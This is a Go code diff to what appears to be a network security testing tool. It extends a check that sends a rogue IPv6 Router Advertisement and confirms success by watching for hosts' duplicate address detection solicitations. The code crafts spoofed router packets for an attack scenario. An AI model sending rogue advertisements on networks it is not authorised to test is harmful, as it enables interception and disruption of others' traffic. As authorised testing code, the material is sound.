@@ -10,7 +10,9 @@ import (
 	"context"
 	"encoding/binary"
 	"encoding/json"
+	"fmt"
 	"net"
+	"time"
 
 	"github.com/gopacket/gopacket"
 	"github.com/gopacket/gopacket/layers"
@@ -30,39 +32,68 @@ type rogueRAFinding struct {
 
 // RunRogueRA sends one Router Advertisement for the target's IPv6 prefix
 // from the attack leg's MAC and its EUI-64 link-local address, with the
-// 1800 s router lifetime the catalog carries as the decay bound. The
-// preferred lifetime and flags are probe content. The verdict is pending:
-// whether hosts took the router needs a probe of their tables it does not
-// have.
+// 1800 s router lifetime the catalog carries as the decay bound, and reads
+// the attack leg. The preferred lifetime and flags are probe content. The
+// predicate is a Neighbor Solicitation from another sender whose source is
+// unspecified and whose target lies within the prefix: the duplicate
+// address detection a host runs on an address it formed from the prefix
+// (RFC 4862 section 5.5.3 item (d), section 5.4), which confirms; none
+// within the window resists. An attack leg whose MAC is not six octets
+// is a target error, since no link-local address derives from it.
 func RunRogueRA(ctx context.Context, deps check.Deps) (check.Verdict, error) {
 	if err := deps.Target.Need(check.FieldPrefix6); err != nil {
 		return check.Verdict{}, err
 	}
 	src := deps.AttackLeg.Addr().MAC
+	prefix := deps.Target.Prefix6
 
-	pkt, err := craftRogueRA(src, deps.Target.Prefix6)
+	pkt, err := craftRogueRA(src, prefix)
 	if err != nil {
+		if check.IsTargetError(err) {
+			return check.Verdict{}, err
+		}
 		return check.Verdict{}, errs.Wrap(err, "roguera: craft RA")
 	}
 	if err := deps.AttackLeg.Send(ctx, pkt); err != nil {
 		return check.Verdict{}, errs.Wrap(err, "roguera: send RA")
 	}
 
+	var formed net.IP
+	found, obs, err := check.First(ctx, deps.AttackLeg, deps.Observe, func(data []byte) bool {
+		target, ok := isDADSolicitIn(data, src, prefix)
+		if ok {
+			formed = target
+		}
+		return ok
+	})
+	if err != nil {
+		if ctx.Err() != nil {
+			return check.Verdict{}, ctx.Err()
+		}
+		return check.Verdict{}, errs.Wrap(err, "roguera: receive solicitation")
+	}
+
 	detail, _ := json.Marshal(rogueRAFinding{
 		Action:         "rogue-router-advertisement",
 		RouterLifetime: 1800,
-		Prefix:         deps.Target.Prefix6.String(),
+		Prefix:         prefix.String(),
 		DecayNote:      "~1800s lifetime announced",
 	})
 	deps.Emitter.Finding("ra", detail)
 
-	return check.Pending("no observable: router acceptance needs a probe of a host's router list"), nil
+	if found != nil {
+		return check.Confirmed(fmt.Sprintf("a host formed %s in %s and ran duplicate address detection for it", formed, prefix), obs.Elapsed), nil
+	}
+	return check.Resisted(fmt.Sprintf("no host formed an address in %s within %s", prefix, obs.Elapsed.Round(time.Millisecond)), obs.Elapsed), nil
 }
 
 // craftRogueRA builds a Router Advertisement from the rogue router
 // announcing prefix.
 func craftRogueRA(src net.HardwareAddr, prefix *net.IPNet) ([]byte, error) {
-	linkLocal := linkLocalFromMAC(src)
+	linkLocal, err := linkLocalFromMAC(src)
+	if err != nil {
+		return nil, err
+	}
 	prefixLen, _ := prefix.Mask.Size()
 
 	eth := &layers.Ethernet{
